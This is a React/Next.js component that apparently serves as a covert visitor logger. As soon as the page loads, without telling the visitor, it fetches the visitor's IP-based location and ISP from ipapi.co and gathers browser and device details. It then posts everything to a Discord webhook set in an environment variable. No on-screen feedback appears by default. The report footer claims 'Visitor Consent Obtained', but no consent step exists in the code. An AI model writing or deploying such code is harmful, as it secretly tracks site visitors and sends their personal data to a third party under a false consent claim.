"use client";
import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { CheckCircle, XCircle, Loader2 } from "lucide-react";

interface VisitorData {
  ip: string;
  city: string;
  region: string;
  country_name: string;
  org: string;
}

interface WebhookStatus {
  status: "idle" | "loading" | "success" | "error";
  message?: string;
}

export default function SendToWebhook({
  showFeedback = false,
  debugMode = false,
}: {
  showFeedback?: boolean;
  debugMode?: boolean;
}) {
  const [status, setStatus] = useState<WebhookStatus>({ status: "idle" });

  const getVisitorData = async (): Promise<VisitorData> => {
    try {
      const response = await fetch("https://ipapi.co/json/");
      if (!response.ok) throw new Error("Failed to fetch IP data");
      return await response.json();
    } catch (error) {
      throw new Error("Failed to get visitor data");
    }
  };

  const getSystemData = () => ({
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  });

  const createWebhookPayload = (ipData: VisitorData, systemData: any) => ({
    username: "Visitor Report Bot",
    avatar_url: "https://i.imgur.com/4M34hi2.png",
    embeds: [
      {
        title: "🌐 New Visitor Report",
        description: "A detailed report of a website visitor.",
        color: 0xff5733,
        fields: [
          {
            name: "📍 IP Address",
            value: ipData.ip || "Unknown",
            inline: true,
          },
          {
            name: "🌆 Location",
            value: `${ipData.city || "Unknown"}, ${ipData.region || "Unknown"}`,
            inline: true,
          },
          {
            name: "🌎 Country",
            value: ipData.country_name || "Unknown",
            inline: true,
          },
          {
            name: "📡 ISP",
            value: ipData.org || "Unknown",
            inline: true,
          },
          {
            name: "🖥️ Device Platform",
            value: systemData.platform || "Unknown",
            inline: true,
          },
          {
            name: "🌐 Browser Language",
            value: systemData.language || "Unknown",
            inline: true,
          },
          {
            name: "⏰ Timezone",
            value: systemData.timezone || "Unknown",
            inline: true,
          },
          {
            name: "🖥️ Screen Resolution",
            value: `${systemData.screenWidth}x${systemData.screenHeight}`,
            inline: true,
          },
          {
            name: "🖥️ User-Agent",
            value: systemData.userAgent || "Unknown",
            inline: false,
          },
        ],
        footer: {
          text: `Report generated at: ${new Date().toLocaleString()} | Visitor Consent Obtained`,
        },
        thumbnail: {
          url: "https://media.istockphoto.com/id/1279759208/vector/jester-hat-e-sport-vector-icon-illustration.jpg?s=612x612&w=0&k=20&c=aOzjxPgq9__AEyQsC1SXGKmspOARFA3UhlCse3TXVdc=",
        },
      },
    ],
  });

  const sendReport = async () => {
    const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      setStatus({
        status: "error",
        message: "Webhook URL is not configured",
      });
      return;
    }

    try {
      setStatus({ status: "loading" });

      const ipData = await getVisitorData();
      const systemData = getSystemData();
      const payload = createWebhookPayload(ipData, systemData);

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!response.ok) throw new Error("Failed to send webhook");

      setStatus({
        status: "success",
        message: "Report sent successfully",
      });

      if (debugMode) {
        console.log("Webhook payload:", payload);
      }
    } catch (error) {
      setStatus({
        status: "error",
        message:
          error instanceof Error ? error.message : "Unknown error occurred",
      });
      if (debugMode) {
        console.error("Webhook error:", error);
      }
    }
  };

  useEffect(() => {
    sendReport();
  }, []);

  if (!showFeedback) return null;

  return (
    <AnimatePresence>
      {status.status !== "idle" && (
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: 50 }}
          className="fixed bottom-4 right-4 z-50"
        >
          <div
            className="bg-gray-900/90 backdrop-blur-md border border-red-950/50
                        rounded-lg shadow-lg p-4 flex items-center space-x-3"
          >
            {status.status === "loading" && (
              <Loader2 className="w-5 h-5 text-red-500 animate-spin" />
            )}
            {status.status === "success" && (
              <CheckCircle className="w-5 h-5 text-green-500" />
            )}
            {status.status === "error" && (
              <XCircle className="w-5 h-5 text-red-500" />
            )}
            <span className="text-sm text-white">
              {status.message || "Processing..."}
            </span>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
